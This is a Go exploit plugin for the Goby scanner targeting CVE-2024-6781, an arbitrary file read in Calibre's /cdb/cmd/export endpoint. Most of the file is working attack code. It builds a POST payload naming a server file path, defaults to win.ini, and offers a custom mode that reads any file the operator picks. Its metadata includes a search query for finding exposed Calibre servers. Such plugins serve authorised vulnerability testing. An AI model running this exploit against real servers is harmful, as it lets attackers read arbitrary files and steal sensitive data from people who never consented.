package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Calibre /cdb/cmd/export File Read Vulnerability(CVE-2024-6781)",
    "Description": "<p>Calibre is an open-source e-book management software. The software has an arbitrary file read vulnerability that allows attackers to read any file on the server, potentially leading to sensitive information disclosure.</p>",
    "Product": "Calibre",
    "Homepage": "https://calibre-ebook.com/",
    "DisclosureDate": "2024-07-30",
    "PostTime": "2024-11-07",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"calibre\" && body= \"Loading, please wait\"",
    "GobyQuery": "body=\"calibre\" && body= \"Loading, please wait\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to read any file on the server, potentially leading to sensitive information disclosure.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://calibre-ebook.com/\">https://calibre-ebook.com/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/Calibre/Calibre%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2024-6781).md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:\\\\Windows\\\\win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-6781"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Calibre /cdb/cmd/export 文件读取漏洞（CVE-2024-6781）",
            "Product": "Calibre",
            "Description": "<p>Calibre是一款开源的电子书管理软件。该软件存在任意文件读取漏洞，攻击者可以利用此漏洞读取服务器上的任意文件，可能导致敏感信息泄露。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;<br></p><p><a href=\"https://calibre-ebook.com/\">https://calibre-ebook.com/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可以利用此漏洞读取服务器上的任意文件，可能导致敏感信息泄露。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Calibre /cdb/cmd/export File Read Vulnerability(CVE-2024-6781)",
            "Product": "Calibre",
            "Description": "<p>Calibre is an open-source e-book management software. The software has an arbitrary file read vulnerability that allows attackers to read any file on the server, potentially leading to sensitive information disclosure.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://calibre-ebook.com/\">https://calibre-ebook.com/</a><br></p><p>2.Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read any file on the server, potentially leading to sensitive information disclosure.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

postOrGet_saklvgjang := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
	setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
		postRequest := httpclient.NewPostRequestConfig(url)
		postRequest.Timeout = 15
		postRequest.VerifyTls = false
		postRequest.FollowRedirect = false
		postRequest.Data = payload
		for headName, headValue := range head {
			postRequest.Header.Store(headName, headValue)
		}
		return httpclient.DoHttpRequest(hostInfo, postRequest)
	}
	defineHeader := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Content-Type":  "application/json",
	}

	urlPost := "/cdb/cmd/export"
	postData := fmt.Sprintf(`["extra_file", 1, "%s", ""]`, filePath)

	resp, err := setPostRequest(hostInfo, urlPost, postData, defineHeader)
	if err != nil || resp.StatusCode != 200 {
		return "", err
	}
	// 注意：返回值为（最终要返回的读取结果，错误）
	lines := strings.Split(resp.RawBody[12:len(resp.RawBody)-2], "\\r\\n")
	var result strings.Builder
	for _, line := range lines {
        result.WriteString(line + "\n") // 将每一行加入到结果中，并添加换行符
    }
	output := result.String()
	return output, nil
}

ExpManager.AddExploit(NewExploit(
	goutils.GetFileName(),
	expJson,
	func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		// 此处需要修改：设置成功后的vulurl
		vulURL := "/cdb/cmd/export"
		// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
		defaultModeMap := map[string]string{
			"C:\\\\Windows\\\\win.ini": "; for 16-bit app support",
		}
		// 函数继承
		fileReadFunc := postOrGet_saklvgjang

		// 请注意：后续代码为模板代码，非特殊情况，无需更改
		// ----------------------------------------------------------------------------------------------------------------------------------------------------
		for filePath, fileText := range defaultModeMap {
			resp, err := fileReadFunc(u, filePath)
			if err != nil {
				continue
			}
			if strings.Contains(resp, fileText) {
				// 设置VULURL
				ss.VulURL = u.HostInfo + vulURL
				return true
			}
		}
		return false
	},

	func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		var fileUrl string
		var fileText string
		mode := goutils.B2S(ss.Params["mode"])
		// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
		defaultModeMap := map[string][2]string{
			"win.ini": {"C:\\\\Windows\\\\win.ini", "; for 16-bit app support"},
		}
		// 此处需要修改：函数继承
		fileReadFunc := postOrGet_saklvgjang

		// 请注意，后续代码为模板固化，正常情况下均无需修改
		// ----------------------------------------------------------------------------------------------------------------------------------------------------
		if mode == "Customize" {
			fileUrl = goutils.B2S(ss.Params["Customize"])
		} else {
			if _, ok := defaultModeMap[mode]; ok {
				fileUrl = defaultModeMap[mode][0]
				fileText = defaultModeMap[mode][1]
			} else {
				expResult.Success = false
				return expResult
			}
		}

		// 获取返回结果url和返回请求头
		resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
		if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
			expResult.Success = false
			return expResult
		}

		expResult.Success = true
		expResult.Output = resp
		return expResult
	},
))
}
